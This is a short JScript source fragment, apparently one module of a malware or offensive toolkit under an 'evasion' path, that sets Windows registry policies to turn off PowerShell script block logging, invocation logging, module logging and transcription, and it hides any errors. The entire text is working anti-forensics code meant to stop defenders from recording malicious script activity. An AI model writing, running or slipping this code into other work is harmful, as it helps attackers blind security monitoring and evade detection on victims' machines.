// chunk: evasion/script_log_disable
// depends: (none)
// provides: disable_scriptlog
// format: jscript
// note: Disables PowerShell ScriptBlockLogging and Module Logging via
//       HKCU registry policies. Prevents script content from being recorded.

function disable_scriptlog() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var psBase = "HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\";
        sh.RegWrite(psBase + "ScriptBlockLogging\\EnableScriptBlockLogging", 0, "REG_DWORD");
        sh.RegWrite(psBase + "ScriptBlockLogging\\EnableScriptBlockInvocationLogging", 0, "REG_DWORD");
        sh.RegWrite(psBase + "ModuleLogging\\EnableModuleLogging", 0, "REG_DWORD");
        sh.RegWrite(psBase + "Transcription\\EnableTranscripting", 0, "REG_DWORD");
    } catch(e) {}
}
